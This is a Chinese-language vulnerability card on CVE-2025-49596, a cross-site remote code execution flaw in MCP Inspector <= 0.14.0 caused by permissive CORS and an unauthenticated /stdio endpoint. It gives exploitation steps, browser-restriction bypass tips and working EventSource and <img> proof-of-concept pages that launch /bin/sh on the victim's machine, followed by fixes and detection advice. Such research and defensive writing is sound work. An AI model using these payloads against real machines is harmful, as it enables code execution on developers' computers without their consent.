---
id: ai-security-mcp-security-inspector-cors-stdio-rce
title: MCP Inspector 宽 CORS 与无鉴权 stdio 参数导致跨站 RCE
type: scenario
domain: ai-security
path: ai-security/mcp-security
technique: mcp-inspector-cors-stdio-command-rce
tags:
- mcp
- csrf
- cors
- rce
- inspector
- stdio
- localhost
- browser
cve:
- CVE-2025-49596
severity: critical
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
affected_versions: '@modelcontextprotocol/inspector <= 0.14.0（0.14.1 修复）'
verification:
  verified_by: verifier-V2
  verified_at: '2026-11-04T21:35:20+08:00'
  notes: 已对照原文核对：CVE-2025-49596、<=0.14.0、/stdio query 控制 command/args、EventSource/img PoC、Chrome LNA 前提、0.14.1 修复（originValidationMiddleware+authMiddleware token）均与原文及截图一致；未独立复现浏览器侧调用。卡片'width CORS'疑为'wide CORS'笔误，不影响内容。
url: /docs/ai-security/mcp-security/ai-security-mcp-security-inspector-cors-stdio-rce/
draft: false
kb_aliases:
- MCP Inspector CSRF
- CVE-2025-49596
- MCP 未授权 CSRF
- stdio command 注入
- 浏览器跨站启动本地进程
---

## 一句话结论

MCP Inspector 0.14.0 及更早版本的 Express 服务使用默认 `cors()`（允许任意 Origin）且没有认证中间件，其 `/stdio` 接口直接从 query 读取 `transportType/command/args/env` 并启动本地进程；攻击者页面可用 `EventSource` 或 `<img>` 发起跨站 GET，让受害者本机执行任意命令，形成未授权跨站 RCE。

## 原理

- Inspector 是 MCP 的本地调试工具，默认在 localhost 启动 Web UI 与代理端口。漏洞版本的核心代码只有：
  ```javascript
  const app = express();
  app.use(cors());   // 默认 Access-Control-Allow-Origin: *
  ```
  没有认证中间件，也没有 Origin 白名单。
- `/stdio` 的 `createTransport` 直接解析 query：
  ```javascript
  const transportType = query.transportType as string;
  if (transportType === "stdio") {
      const command = (query.command as string).trim();
      const origArgs = shellParseArgs(query.args as string) as string[];
      const queryEnv = query.env ? JSON.parse(query.env as string) : {};
      const env = { ...defaultEnvironment, ...process.env, ...queryEnv };
      const { cmd, args } = findActualExecutable(command, origArgs);
      const transport = new StdioClientTransport({ command: cmd, args, env, stderr: "pipe" });
  }
  ```
  即：`transportType=stdio` 时，`command` 与 `args` 完全由请求方控制，直接传给 `StdioClientTransport` 启动子进程。
- CORS 只限制“浏览器是否允许脚本读取响应”，不限制“请求是否发出”。攻击者不需要读取返回值，只要请求到达并触发进程启动即可。
- GET 请求可以用 `EventSource`（SSE）或 `<img>` 发出，不需要预检；跨站页面因此能触发 `/stdio`。
- 浏览器侧限制：Chrome 142 引入 Local Network Access（LNA），将地址空间分为 loopback > local > public；public 页面访问 loopback 属于更私有地址空间请求，要求发起方是 secure context 且用户授权。攻击者把页面挂到 HTTPS 后，实测可触发（且未弹窗）；`img` 标签 GET 也能成功。LNA 对 local→loopback 未限制。
- 结果：`width CORS -> 无鉴权 -> query 控制 stdio command -> Inspector 启动本地进程`，形成跨站命令执行。

## 触发条件

- 受害者本机运行 MCP Inspector `<= 0.14.0`，默认监听 localhost 的 UI/代理端口。
- 受害者浏览器访问攻击者可控页面（个人博客、被控站点、LLM 浏览器代理抓取的页面等）。
- 浏览器允许该页面向 loopback 发起请求；Chrome 142+ 需 HTTPS 页面（public→loopback 的 LNA 限制），`img` GET 可绕过部分限制。
- Inspector 进程有权限执行目标命令（通常与当前用户相同）。

## 利用步骤

1. 确认目标本机 Inspector 版本 `<= 0.14.0`，并找到其 `/stdio` 端点（默认 UI 6274、代理 6277，实际以启动日志为准）。
2. 构造恶意页面，用 `EventSource` 请求 `/stdio`，参数 `transportType=stdio`、`command=/bin/sh`、`args=-c 'touch /tmp/pwned'`。
3. 诱导受害者访问页面；浏览器发出跨站 GET，Inspector 解析 query 并启动 `/bin/sh -c 'touch /tmp/pwned'`。
4. 若被 LNA 拦截，把页面部署到 HTTPS，或改用 `<img src=...>` 方式发送 GET。
5. 将命令替换为反弹 shell、下载执行、写入 SSH key 等，完成进一步控制。

## PoC

```html
<!doctype html>
<meta charset="utf-8">
<pre id="out"></pre>
<script>
const params = new URLSearchParams({
  transportType: "stdio",
  command: "/bin/sh",
  args: "-c 'touch /tmp/pwned'"
});
const source = new EventSource(`http://127.0.0.1:24959/stdio?${params}`);
source.onopen = () => {
  out.textContent += "opened cross-origin SSE\n";
  source.close();
};
</script>
```

`img` 变体：

```html
<img src="http://127.0.0.1:24959/stdio?transportType=stdio&command=%2Fbin%2Fsh&args=-c+%27touch+%2Ftmp%2Fpwned%27">
```

预期：受害本机 Inspector 启动 `/bin/sh -c 'touch /tmp/pwned'`，`/tmp/pwned` 被创建；攻击者页面无需读取响应。

## 变体与关联

- 变体：`EventSource`（GET/SSE）与 `<img>`（GET）都可发送；`fetch` 异步请求在 Chrome LNA 下可能先被拦截。
- 变体：HTTPS 页面可满足 LNA 的 secure context 要求；local→loopback 目前未受 LNA 限制。
- 变体：除 `/stdio` 外，Inspector 的其它控制面接口同样缺少认证与 Origin 校验，可探测其他 transport/工具调用入口。
- 变体：MCP Go SDK `<= 1.4.0`（CVE-2026-33252）的 Streamable HTTP 入口缺少 Origin 校验与 Content-Type 限制，理论上可用 `text/plain` simple request 绕过预检；但最新 Chrome 的 LNA 与 Accept 头解析（`*/*;q=0.8` 不匹配 `*/*`）使原文未能打通，按“未验证可复现”不单独建卡，作为同类攻击面记录。
- 关联：MCP 安全目录下关于工具描述注入、权限与供应链的卡片；本卡聚焦本地 MCP 控制面端点的浏览器跨站调用。

## 检测与防御

- 修复：升级 `@modelcontextprotocol/inspector` 到 0.14.1 及以上；新版引入 `originValidationMiddleware`（Origin 白名单，默认只允许 Inspector 自身域）与 `authMiddleware`（随机 token，请求头 `X-MCP-Proxy-Auth`）。
- 修复：不要使用默认 `cors()` 放行任意 Origin；控制面接口只允许明确的受信 MCP client 来源。
- 修复：MCP HTTP 端点必须要求强随机 Token 或标准 OAuth/OIDC 授权上下文，不能把“监听在 127.0.0.1”当作可信边界。
- 加固：默认绑定 loopback，仅在需要时启动 Inspector，用完即关；限制 `/stdio` 的 command/args 白名单，避免任意进程启动。
- 加固：校验 `Origin`/`Sec-Fetch-Site`，做好 Host/DNS rebinding 防护；非同源非安全请求默认 403。
- 检测：Inspector 日志中出现跨站 Origin 访问 `/stdio`、`transportType=stdio` 且 command 为 shell/解释器、异常子进程；浏览器侧 LNA 拦截日志。
- 检测：本机出现由 Inspector 进程拉起的非预期子进程（`/bin/sh`、`powershell`、`cmd` 等），以及临时目录出现可疑文件。
